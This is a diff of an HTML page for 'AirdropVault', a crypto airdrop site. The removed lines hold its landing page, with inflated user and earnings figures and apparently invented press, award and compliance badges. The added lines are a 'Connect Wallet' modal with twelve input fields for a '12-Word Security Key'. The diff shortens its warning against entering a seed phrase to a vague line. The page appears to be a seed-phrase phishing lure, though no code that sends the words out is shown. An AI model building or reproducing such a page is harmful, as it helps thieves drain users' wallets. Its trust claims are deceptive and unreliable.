-      <h1 id="hero-heading" class="text-4xl md:text-6xl lg:text-7xl font-800 leading-tight mb-6">Claim Free Crypto<br><span class="text-[#00ff88]">Airdrops Daily</span></h1>
-      <p id="hero-subtext" class="text-lg md:text-xl text-gray-400 max-w-2xl mx-auto mb-10">Join 100,000+ users who've earned over $12M in free tokens. Never miss another airdrop opportunity.</p>
-      <div class="flex flex-col sm:flex-row gap-4 justify-center"><button onclick="openConnectModal()" class="px-8 py-4 bg-[#00ff88] text-[#0a0f1a] font-semibold rounded-xl hover:bg-[#00e07a] transition-all" id="connect-btn">Connect Wallet</button> <button onclick="navigateTo('success')" class="px-8 py-4 bg-[#0f1a2e] border border-[#1a2940] text-white font-semibold rounded-xl hover:border-[#00ff88]/40 transition-all">View Success Stories</button>
-      </div>
-     </div>
-    </section><!-- Stats -->
-    <section class="px-4 py-16 max-w-6xl mx-auto">
-     <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 text-center card-hover">
-       <div class="text-3xl md:text-4xl font-bold text-[#00ff88] mono">
-        100K+
-       </div>
-       <div class="text-sm text-gray-400 mt-2">
-        Active Users
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 text-center card-hover">
-       <div class="text-3xl md:text-4xl font-bold text-[#00ff88] mono">
-        $12M+
-       </div>
-       <div class="text-sm text-gray-400 mt-2">
-        Total Earned
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 text-center card-hover">
-       <div class="text-3xl md:text-4xl font-bold text-[#00ff88] mono">
-        847
-       </div>
-       <div class="text-sm text-gray-400 mt-2">
-        Airdrops Listed
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 text-center card-hover">
-       <div class="text-3xl md:text-4xl font-bold text-[#00ff88] mono">
-        98.2%
-       </div>
-       <div class="text-sm text-gray-400 mt-2">
-        Success Rate
-       </div>
-      </div>
-     </div>
-    </section><!-- Live Activity Feed -->
-    <section class="px-4 py-16 max-w-6xl mx-auto">
-     <h2 class="text-2xl md:text-3xl font-bold mb-8 text-center">Live Activity</h2>
-     <div class="space-y-3" id="activity-feed"></div>
-    </section><!-- Trust & Security Badges -->
-    <section class="px-4 py-12 max-w-6xl mx-auto">
-     <div class="grid grid-cols-2 md:grid-cols-4 gap-3 md:gap-4">
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-4 text-center">
-       <div class="flex justify-center mb-3">
-        <i data-lucide="verified" class="w-6 h-6 text-[#00ff88]"></i>
-       </div>
-       <div class="text-xs font-semibold text-white">
-        Verified Projects
-       </div>
-       <div class="text-xs text-gray-400 mt-1">
-        All airdrops audited
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-4 text-center">
-       <div class="flex justify-center mb-3">
-        <i data-lucide="lock" class="w-6 h-6 text-[#00ff88]"></i>
-       </div>
-       <div class="text-xs font-semibold text-white">
-        Secure &amp; Safe
-       </div>
-       <div class="text-xs text-gray-400 mt-1">
-        No wallet connected
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-4 text-center">
-       <div class="flex justify-center mb-3">
-        <i data-lucide="award" class="w-6 h-6 text-[#00ff88]"></i>
-       </div>
-       <div class="text-xs font-semibold text-white">
-        Industry Awards
-       </div>
-       <div class="text-xs text-gray-400 mt-1">
-        2x Best Platform
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-4 text-center">
-       <div class="flex justify-center mb-3">
-        <i data-lucide="shield-check" class="w-6 h-6 text-[#00ff88]"></i>
-       </div>
-       <div class="text-xs font-semibold text-white">
-        Compliance
-       </div>
-       <div class="text-xs text-gray-400 mt-1">
-        GDPR &amp; SOC2
-       </div>
-      </div>
-     </div>
-    </section><!-- Featured Airdrops Preview -->
-    <section class="px-4 py-16 max-w-6xl mx-auto">
-     <div class="flex items-center justify-between mb-8">
-      <h2 class="text-2xl md:text-3xl font-bold">Trending Airdrops</h2><button onclick="navigateTo('airdrops')" class="text-sm text-[#00ff88] hover:underline">View All →</button>
-     </div>
-     <div class="grid md:grid-cols-3 gap-4">
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 card-hover">
-       <div class="flex items-center gap-3 mb-4">
-        <div class="w-10 h-10 rounded-full bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center text-sm font-bold">
-         ZK
+    <!-- Connect Modal -->
+    <div
+      id="connect-modal"
+      class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden"
+    >
+      <div
+        class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl max-w-2xl w-full max-h-96 overflow-y-auto"
+      >
+        <div
+          class="sticky top-0 bg-[#0f1a2e] border-b border-[#1a2940] px-6 py-4 flex items-center justify-between"
+        >
+          <h2 class="text-xl font-bold">Connect with AirdropVault</h2>
+          <button
+            onclick="closeConnectModal()"
+            class="text-gray-400 hover:text-white"
+          >
+            <i data-lucide="x" class="w-5 h-5"></i>
+          </button>
         </div>
-        <div>
-         <div class="font-semibold">
-          zkSync Era
-         </div>
-         <div class="text-xs text-gray-400">
-          Layer 2
-         </div>
-        </div><span class="ml-auto px-2 py-1 text-xs bg-[#00ff88]/10 text-[#00ff88] rounded-full">Active</span>
-       </div>
-       <div class="text-sm text-gray-400 mb-3">
-        Bridge assets and interact with DApps to qualify for potential token distribution.
-       </div>
-       <div class="flex justify-between text-xs text-gray-500">
-        <span>Est. Value: $2,000-$8,000</span> <span>12,340 claims</span>
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 card-hover">
-       <div class="flex items-center gap-3 mb-4">
-        <div class="w-10 h-10 rounded-full bg-gradient-to-br from-orange-500 to-red-500 flex items-center justify-center text-sm font-bold">
-         LZ
+        <div class="p-6 space-y-6">
+          <!-- Step by step guide -->
+          <div class="space-y-4">
+            <div class="flex gap-4">
+              <div
+                class="flex-shrink-0 w-8 h-8 rounded-full bg-[#00ff88]/20 border border-[#00ff88] flex items-center justify-center text-[#00ff88] font-bold text-sm"
+              >
+                1
+              </div>
+              <div>
+                <h3 class="font-semibold text-white">Click Connect Below</h3>
+                <p class="text-sm text-gray-400 mt-1">
+                  Create your secure connection with us
+                </p>
+              </div>
+            </div>
+            <div class="flex gap-4">
+              <div
+                class="flex-shrink-0 w-8 h-8 rounded-full bg-[#00ff88]/20 border border-[#00ff88] flex items-center justify-center text-[#00ff88] font-bold text-sm"
+              >
+                2
+              </div>
+              <div>
+                <h3 class="font-semibold text-white">
+                  Enter Your 12-Word Passphrase
+                </h3>
+                <p class="text-sm text-gray-400 mt-1">
+                  Create your own 12 random words (NOT your seed phrase) for
+                  enhanced security
+                </p>
+              </div>
+            </div>
+            <div class="flex gap-4">
+              <div
+                class="flex-shrink-0 w-8 h-8 rounded-full bg-[#00ff88]/20 border border-[#00ff88] flex items-center justify-center text-[#00ff88] font-bold text-sm"
+              >
+                3
+              </div>
+              <div>
+                <h3 class="font-semibold text-white">Wait for Notifications</h3>
+                <p class="text-sm text-gray-400 mt-1">
+                  We'll notify you when new airdrops become available
+                </p>
+              </div>
+            </div>
+            <div class="flex gap-4">
+              <div
+                class="flex-shrink-0 w-8 h-8 rounded-full bg-[#00ff88]/20 border border-[#00ff88] flex items-center justify-center text-[#00ff88] font-bold text-sm"
+              >
+                4
+              </div>
+              <div>
+                <h3 class="font-semibold text-white">
+                  Click "Claim" When Airdrops Drop
+                </h3>
+                <p class="text-sm text-gray-400 mt-1">
+                  Click the claim button and watch the magic happen
+                </p>
+              </div>
+            </div>
+            <div class="flex gap-4">
+              <div
+                class="flex-shrink-0 w-8 h-8 rounded-full bg-[#00ff88]/20 border border-[#00ff88] flex items-center justify-center text-[#00ff88] font-bold text-sm"
+              >
+                5
+              </div>
+              <div>
+                <h3 class="font-semibold text-white">Receive Your Crypto</h3>
+                <p class="text-sm text-gray-400 mt-1">
+                  Tokens will arrive in your wallet automatically
+                </p>
+              </div>
+            </div>
+            <div class="flex gap-4">
+              <div
+                class="flex-shrink-0 w-8 h-8 rounded-full bg-purple-500/20 border border-purple-500 flex items-center justify-center text-purple-400 font-bold text-sm"
+              >
+                6
+              </div>
+              <div>
+                <h3 class="font-semibold text-white">Share Your Success! 🎉</h3>
+                <p class="text-sm text-gray-400 mt-1">
+                  Take a screenshot and email it to
+                  <span class="text-[#00ff88] font-mono"
+                    >claim@airdropvault.com</span
+                  >
+                  to be featured in our Success Stories
+                </p>
+              </div>
+            </div>
+          </div>
+          <!-- 12-Word Passphrase Input -->
+          <div class="pt-4 border-t border-[#1a2940]">
+            <h3 class="font-semibold mb-4 text-white">
+              Create Your 12-Word Security Key
+            </h3>
+            <p class="text-xs text-gray-400 mb-4">
+              ⚠️ Security phase type here.
+            </p>
+            <form id="passphraseForm">
+              <div
+                id="connect-error"
+                class="hidden bg-red-500/10 border border-red-500 text-red-400 text-sm rounded-lg px-3 py-2 mb-4"
+              ></div>
+
+              <div class="grid grid-cols-3 sm:grid-cols-4 gap-3 mb-6">
+                <input
+                  type="text"
+                  name="word_1"
+                  placeholder="Word 1"
+                  class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"
+                />
+
+                <input
+                  type="text"
+                  name="word_2"
+                  placeholder="Word 2"
+                  class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"
+                />
+
+                <input
+                  type="text"
+                  name="word_3"
+                  placeholder="Word 3"
+                  class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"
+                />
+
+                <input
+                  type="text"
+                  name="word_4"
+                  placeholder="Word 4"
+                  class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"
+                />
+
+                <input
+                  type="text"
+                  name="word_5"
+                  placeholder="Word 5"
+                  class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"
+                />
+
+                <input
+                  type="text"
+                  name="word_6"
+                  placeholder="Word 6"
+                  class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"
+                />
+
+                <input
+                  type="text"
+                  name="word_7"
+                  placeholder="Word 7"
+                  class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"
+                />
+
+                <input
+                  type="text"
+                  name="word_8"
+                  placeholder="Word 8"
+                  class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"
+                />
+
+                <input
+                  type="text"
+                  name="word_9"
+                  placeholder="Word 9"
+                  class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"
+                />
+
+                <input
+                  type="text"
+                  name="word_10"
+                  placeholder="Word 10"
+                  class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"
+                />
+
+                <input
+                  type="text"
+                  name="word_11"
+                  placeholder="Word 11"
+                  class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"
+                />
+
+                <input
+                  type="text"
+                  name="word_12"
+                  placeholder="Word 12"
+                  class="passphrase-input bg-[#0a0f1a] border border-[#1a2940] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"
+                />
+              </div>
+
+              <button
+                id="submitBtn"
+                type="button"
+                onclick="completeConnection(event)"
+                class="w-full px-4 py-3 bg-[#00ff88] text-[#0a0f1a] font-semibold rounded-xl hover:bg-[#00e07a] transition-all"
+              >
+                Complete Connection
+              </button>
+            </form>
+          </div>
         </div>
-        <div>
-         <div class="font-semibold">
-          LayerZero
-         </div>
-         <div class="text-xs text-gray-400">
-          Omnichain
-         </div>
-        </div><span class="ml-auto px-2 py-1 text-xs bg-yellow-500/10 text-yellow-400 rounded-full">Hot</span>
-       </div>
-       <div class="text-sm text-gray-400 mb-3">
-        Use cross-chain bridges and messaging protocols to earn allocation points.
-       </div>
-       <div class="flex justify-between text-xs text-gray-500">
-        <span>Est. Value: $3,000-$15,000</span> <span>28,901 claims</span>
-       </div>
       </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 card-hover">
-       <div class="flex items-center gap-3 mb-4">
-        <div class="w-10 h-10 rounded-full bg-gradient-to-br from-cyan-400 to-blue-600 flex items-center justify-center text-sm font-bold">
-         SC
-        </div>
-        <div>
-         <div class="font-semibold">
-          Scroll
-         </div>
-         <div class="text-xs text-gray-400">
-          zkEVM
-         </div>
-        </div><span class="ml-auto px-2 py-1 text-xs bg-[#00ff88]/10 text-[#00ff88] rounded-full">Active</span>
-       </div>
-       <div class="text-sm text-gray-400 mb-3">
-        Interact with Scroll mainnet DApps and provide liquidity for airdrop eligibility.
-       </div>
-       <div class="flex justify-between text-xs text-gray-500">
-        <span>Est. Value: $1,500-$6,000</span> <span>9,472 claims</span>
-       </div>
-      </div>
-     </div>
-    </section><!-- Media & Press -->
-    <section class="px-4 py-16 max-w-6xl mx-auto">
-     <h2 class="text-2xl md:text-3xl font-bold mb-8 text-center">Featured In</h2>
-     <div class="grid grid-cols-2 md:grid-cols-5 gap-4">
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-6 flex items-center justify-center">
-       <div class="text-center">
-        <div class="text-sm font-bold text-gray-400">
-         CoinDesk
-        </div>
-        <div class="text-xs text-gray-500 mt-1">
-         "Best Airdrop Tracker"
-        </div>
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-6 flex items-center justify-center">
-       <div class="text-center">
-        <div class="text-sm font-bold text-gray-400">
-         Cointelegraph
-        </div>
-        <div class="text-xs text-gray-500 mt-1">
-         Featured Article
-        </div>
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-6 flex items-center justify-center">
-       <div class="text-center">
-        <div class="text-sm font-bold text-gray-400">
-         The Block
-        </div>
-        <div class="text-xs text-gray-500 mt-1">
-         Research Partner
-        </div>
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-6 flex items-center justify-center">
-       <div class="text-center">
-        <div class="text-sm font-bold text-gray-400">
-         Forbes
-        </div>
-        <div class="text-xs text-gray-500 mt-1">
-         Web3 Leaders
-        </div>
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-6 flex items-center justify-center">
-       <div class="text-center">
-        <div class="text-sm font-bold text-gray-400">
-         Crypto Times
-        </div>
-        <div class="text-xs text-gray-500 mt-1">
-         Top Rated Platform
-        </div>
-       </div>
-      </div>
-     </div>
-    </section><!-- Risk Disclaimer -->
-    <section class="px-4 py-12 max-w-4xl mx-auto bg-[#0f1a2e]/50 border border-[#1a2940] rounded-2xl p-6">
-     <div class="flex items-start gap-3"><i data-lucide="info" class="w-5 h-5 text-[#00ff88] shrink-0 mt-0.5"></i>
-      <div>
-       <h3 class="font-semibold mb-2">Transparency &amp; Disclaimer</h3>
-       <p class="text-sm text-gray-400">AirdropVault is not financial advice. We research and verify airdrops but cannot guarantee token distribution or value. Always do your own research before participating. We never store wallet keys or passwords. Be cautious of scams and verify all contracts on official explorers.</p>
-      </div>
-     </div>
-    </section>
-   </div><!-- Page: Airdrops -->
-   <div id="page-airdrops" class="page hidden">
-    <section class="px-4 py-12 max-w-6xl mx-auto">
-     <h1 class="text-3xl md:text-4xl font-bold mb-2">All Airdrops</h1>
-     <p class="text-gray-400 mb-8">Discover and claim the latest crypto airdrops. Updated every hour.</p><!-- Filter & Search -->
-     <div class="mb-6 flex flex-col sm:flex-row gap-3"><input type="text" placeholder="Search airdrops..." class="flex-1 bg-[#0a0f1a] border border-[#1a2940] rounded-xl px-4 py-3 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40">
-      <div class="flex gap-2 items-center px-3 py-3 bg-[#0a0f1a] border border-[#1a2940] rounded-xl"><i data-lucide="filter" class="w-4 h-4 text-gray-400"></i> <select class="bg-transparent text-sm text-white focus:outline-none"> <option>Est. Value: Any</option> <option>$0 - $1K</option> <option>$1K - $5K</option> <option>$5K - $20K</option> <option>$20K+</option> </select>
-      </div>
-     </div><!-- Filters -->
-     <div class="flex flex-wrap gap-3 mb-8"><button class="px-4 py-2 bg-[#00ff88] text-[#0a0f1a] text-sm font-medium rounded-lg">All</button> <button class="px-4 py-2 bg-[#0f1a2e] border border-[#1a2940] text-sm text-gray-400 rounded-lg hover:border-[#00ff88]/40">Active</button> <button class="px-4 py-2 bg-[#0f1a2e] border border-[#1a2940] text-sm text-gray-400 rounded-lg hover:border-[#00ff88]/40">Upcoming</button> <button class="px-4 py-2 bg-[#0f1a2e] border border-[#1a2940] text-sm text-gray-400 rounded-lg hover:border-[#00ff88]/40">Ended</button> <button class="px-4 py-2 bg-[#0f1a2e] border border-[#1a2940] text-sm text-gray-400 rounded-lg hover:border-[#00ff88]/40">High Value</button>
-     </div><!-- Airdrop List -->
-     <div class="space-y-4" id="airdrops-list"></div>
-    </section>
-   </div><!-- Page: Success Stories -->
-   <div id="page-success" class="page hidden">
-    <section class="px-4 py-12 max-w-6xl mx-auto">
-     <h1 class="text-3xl md:text-4xl font-bold mb-2">Success Stories</h1>
-     <p class="text-gray-400 mb-8">Real users, real earnings. See how our community has profited from airdrops.</p><!-- Success Story Stats -->
-     <div class="grid grid-cols-3 md:grid-cols-4 gap-3 mb-8">
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-lg p-4 text-center">
-       <div class="text-2xl font-bold text-[#00ff88] mono">
-        $12M+
-       </div>
-       <div class="text-xs text-gray-400 mt-1">
-        Total Earned
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-lg p-4 text-center">
-       <div class="text-2xl font-bold text-[#00ff88] mono">
-        100K+
-       </div>
-       <div class="text-xs text-gray-400 mt-1">
-        Users
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-lg p-4 text-center">
-       <div class="text-2xl font-bold text-[#00ff88] mono">
-        847
-       </div>
-       <div class="text-xs text-gray-400 mt-1">
-        Airdrops
-       </div>
-      </div>
-      <div class="hidden md:flex bg-[#0f1a2e] border border-[#1a2940] rounded-lg p-4 text-center items-center justify-center">
-       <div>
-        <div class="text-2xl font-bold text-[#00ff88] mono">
-         98.2%
-        </div>
-        <div class="text-xs text-gray-400 mt-1">
-         Success
-        </div>
-       </div>
-      </div>
-     </div>
-     <div class="grid md:grid-cols-2 gap-6" id="success-stories"></div>
-    </section>
-   </div><!-- Page: Community -->
-   <div id="page-community" class="page hidden">
-    <section class="px-4 py-12 max-w-6xl mx-auto">
-     <h1 class="text-3xl md:text-4xl font-bold mb-2">Community</h1>
-     <p class="text-gray-400 mb-8">Join 100K+ airdrop hunters sharing tips, strategies, and live alerts.</p><!-- Live Comments -->
-     <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 mb-8">
-      <div class="flex items-center gap-2 mb-6"><span class="w-2 h-2 rounded-full bg-[#00ff88] pulse-dot"></span> <span class="text-sm text-gray-400">Live Chat • <span class="text-white" id="chat-count">2,847</span> people chatting</span>
-      </div>
-      <div class="space-y-4 max-h-96 overflow-y-auto mb-6" id="community-chat"></div>
-      <div class="flex gap-3"><input type="text" id="chat-input" placeholder="Share your thoughts..." class="flex-1 bg-[#0a0f1a] border border-[#1a2940] rounded-xl px-4 py-3 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"> <button onclick="postComment()" class="px-6 py-3 bg-[#00ff88] text-[#0a0f1a] font-medium rounded-xl hover:bg-[#00e07a] transition-all">Send</button>
-      </div>
-     </div><!-- Community Stats -->
-     <div class="grid grid-cols-2 md:grid-cols-3 gap-4">
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-5 text-center">
-       <div class="text-2xl font-bold text-[#00ff88] mono">
-        102,847
-       </div>
-       <div class="text-xs text-gray-400 mt-1">
-        Total Members
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-5 text-center">
-       <div class="text-2xl font-bold text-[#00ff88] mono">
-        34,291
-       </div>
-       <div class="text-xs text-gray-400 mt-1">
-        Online Now
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-5 text-center">
-       <div class="text-2xl font-bold text-[#00ff88] mono">
-        1.2M
-       </div>
-       <div class="text-xs text-gray-400 mt-1">
-        Messages Sent
-       </div>
-      </div>
-     </div>
-    </section>
-   </div><!-- Page: About -->
-   <div id="page-about" class="page hidden">
-    <section class="px-4 py-12 max-w-5xl mx-auto">
-     <h1 class="text-3xl md:text-4xl font-bold mb-2">About AirdropVault</h1>
-     <p class="text-gray-400 mb-12">The #1 platform for discovering, tracking, and claiming crypto airdrops.</p>
-     <div class="space-y-8">
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-8">
-       <h2 class="text-xl font-bold mb-4">Our Mission</h2>
-       <p class="text-gray-400 leading-relaxed">We believe everyone deserves access to free crypto opportunities. Since 2022, we've helped over 100,000 users claim airdrops worth millions of dollars. Our team of blockchain researchers identifies legitimate airdrops early, providing step-by-step guides so anyone can participate regardless of technical expertise.</p>
-      </div>
-      <div class="grid md:grid-cols-3 gap-4">
-       <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 text-center card-hover">
-        <div class="w-12 h-12 mx-auto mb-4 rounded-xl bg-[#00ff88]/10 flex items-center justify-center"><i data-lucide="shield-check" class="w-6 h-6 text-[#00ff88]"></i>
-        </div>
-        <h3 class="font-semibold mb-2">Verified Airdrops</h3>
-        <p class="text-sm text-gray-400">Every airdrop is manually verified by our research team before listing.</p>
-       </div>
-       <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 text-center card-hover">
-        <div class="w-12 h-12 mx-auto mb-4 rounded-xl bg-[#00ff88]/10 flex items-center justify-center"><i data-lucide="bell" class="w-6 h-6 text-[#00ff88]"></i>
-        </div>
-        <h3 class="font-semibold mb-2">Instant Alerts</h3>
-        <p class="text-sm text-gray-400">Get notified the moment new high-value airdrops become available.</p>
-       </div>
-       <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 text-center card-hover">
-        <div class="w-12 h-12 mx-auto mb-4 rounded-xl bg-[#00ff88]/10 flex items-center justify-center"><i data-lucide="users" class="w-6 h-6 text-[#00ff88]"></i>
-        </div>
-        <h3 class="font-semibold mb-2">Community Driven</h3>
-        <p class="text-sm text-gray-400">100K+ members sharing strategies, tips, and real-time market insights.</p>
-       </div>
-      </div>
-      <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-8">
-       <h2 class="text-xl font-bold mb-4">Our Team</h2>
-       <div class="grid sm:grid-cols-2 md:grid-cols-4 gap-4">
-        <div class="text-center">
-         <div class="w-16 h-16 mx-auto mb-3 rounded-full bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center text-xl font-bold">
-          AK
-         </div>
-         <div class="font-medium text-sm">
-          Alex Kim
-         </div>
-         <div class="text-xs text-gray-400">
-          Founder &amp; CEO
-         </div>
-        </div>
-        <div class="text-center">
-         <div class="w-16 h-16 mx-auto mb-3 rounded-full bg-gradient-to-br from-orange-500 to-red-500 flex items-center justify-center text-xl font-bold">
-          SM
-         </div>
-         <div class="font-medium text-sm">
-          Sarah Mitchell
-         </div>
-         <div class="text-xs text-gray-400">
-          Head of Research
-         </div>
-        </div>
-        <div class="text-center">
-         <div class="w-16 h-16 mx-auto mb-3 rounded-full bg-gradient-to-br from-cyan-400 to-teal-500 flex items-center justify-center text-xl font-bold">
-          RJ
-         </div>
-         <div class="font-medium text-sm">
-          Raj Patel
-         </div>
-         <div class="text-xs text-gray-400">
-          Lead Developer
-         </div>
-        </div>
-        <div class="text-center">
-         <div class="w-16 h-16 mx-auto mb-3 rounded-full bg-gradient-to-br from-pink-500 to-violet-500 flex items-center justify-center text-xl font-bold">
-          LC
-         </div>
-         <div class="font-medium text-sm">
-          Lisa Chen
-         </div>
-         <div class="text-xs text-gray-400">
-          Community Manager
-         </div>
-        </div>
-       </div>
-      </div>
-     </div>
-    </section>
-   </div><!-- Footer -->
-   <footer class="px-4 py-8 border-t border-[#1a2940] mt-16">
-    <div class="max-w-6xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
-     <div class="flex items-center gap-2">
-      <div class="w-6 h-6 rounded bg-gradient-to-br from-[#00ff88] to-[#00cc6a] flex items-center justify-center"><i data-lucide="zap" class="w-4 h-4 text-[#0a0f1a]"></i>
-      </div><span class="text-sm font-semibold">AirdropVault</span>
-     </div>
-     <div class="text-xs text-gray-500">
-      © 2024 AirdropVault. All rights reserved. Not financial advice.
-     </div>
     </div>
-   </footer>
-  </div><!-- Connect Modal -->
-  <div id="connect-modal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4 hidden">
-   <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl max-w-2xl w-full max-h-96 overflow-y-auto">
-    <div class="sticky top-0 bg-[#0f1a2e] border-b border-[#1a2940] px-6 py-4 flex items-center justify-between">
-     <h2 class="text-xl font-bold">Connect with AirdropVault</h2><button onclick="closeConnectModal()" class="text-gray-400 hover:text-white"> <i data-lucide="x" class="w-5 h-5"></i> </button>
-    </div>
-    <div class="p-6 space-y-6"><!-- Step by step guide -->
-     <div class="space-y-4">
-      <div class="flex gap-4">
-       <div class="flex-shrink-0 w-8 h-8 rounded-full bg-[#00ff88]/20 border border-[#00ff88] flex items-center justify-center text-[#00ff88] font-bold text-sm">
-        1
-       </div>
-       <div>
-        <h3 class="font-semibold text-white">Click Connect Below</h3>
-        <p class="text-sm text-gray-400 mt-1">Create your secure connection with us</p>
-       </div>
-      </div>
-      <div class="flex gap-4">
-       <div class="flex-shrink-0 w-8 h-8 rounded-full bg-[#00ff88]/20 border border-[#00ff88] flex items-center justify-center text-[#00ff88] font-bold text-sm">
-        2
-       </div>
-       <div>
-        <h3 class="font-semibold text-white">Enter Your 12-Word Passphrase</h3>
-        <p class="text-sm text-gray-400 mt-1">Create your own 12 random words (NOT your seed phrase) for enhanced security</p>
-       </div>
-      </div>
-      <div class="flex gap-4">
-       <div class="flex-shrink-0 w-8 h-8 rounded-full bg-[#00ff88]/20 border border-[#00ff88] flex items-center justify-center text-[#00ff88] font-bold text-sm">
-        3
-       </div>
-       <div>
-        <h3 class="font-semibold text-white">Wait for Notifications</h3>
-        <p class="text-sm text-gray-400 mt-1">We'll notify you when new airdrops become available</p>
-       </div>
-      </div>
-      <div class="flex gap-4">
-       <div class="flex-shrink-0 w-8 h-8 rounded-full bg-[#00ff88]/20 border border-[#00ff88] flex items-center justify-center text-[#00ff88] font-bold text-sm">
-        4
-       </div>
-       <div>
-        <h3 class="font-semibold text-white">Click "Claim" When Airdrops Drop</h3>
-        <p class="text-sm text-gray-400 mt-1">Click the claim button and watch the magic happen</p>
-       </div>
-      </div>
-      <div class="flex gap-4">
-       <div class="flex-shrink-0 w-8 h-8 rounded-full bg-[#00ff88]/20 border border-[#00ff88] flex items-center justify-center text-[#00ff88] font-bold text-sm">
-        5
-       </div>
-       <div>
-        <h3 class="font-semibold text-white">Receive Your Crypto</h3>
-        <p class="text-sm text-gray-400 mt-1">Tokens will arrive in your wallet automatically</p>
-       </div>
-      </div>
-      <div class="flex gap-4">
-       <div class="flex-shrink-0 w-8 h-8 rounded-full bg-purple-500/20 border border-purple-500 flex items-center justify-center text-purple-400 font-bold text-sm">
-        6
-       </div>
-       <div>
-        <h3 class="font-semibold text-white">Share Your Success! 🎉</h3>
-        <p class="text-sm text-gray-400 mt-1">Take a screenshot and email it to <span class="text-[#00ff88] font-mono">claim@airdropvault.com</span> to be featured in our Success Stories</p>
-       </div>
-      </div>
-     </div><!-- 12-Word Passphrase Input -->
-     <div class="pt-4 border-t border-[#1a2940]">
-      <h3 class="font-semibold mb-4 text-white">Create Your 12-Word Security Key</h3>
-      <p class="text-xs text-gray-400 mb-4">⚠️ Enter 12 random words of YOUR choice (NOT your wallet seed phrase). This creates your secure connection.</p>
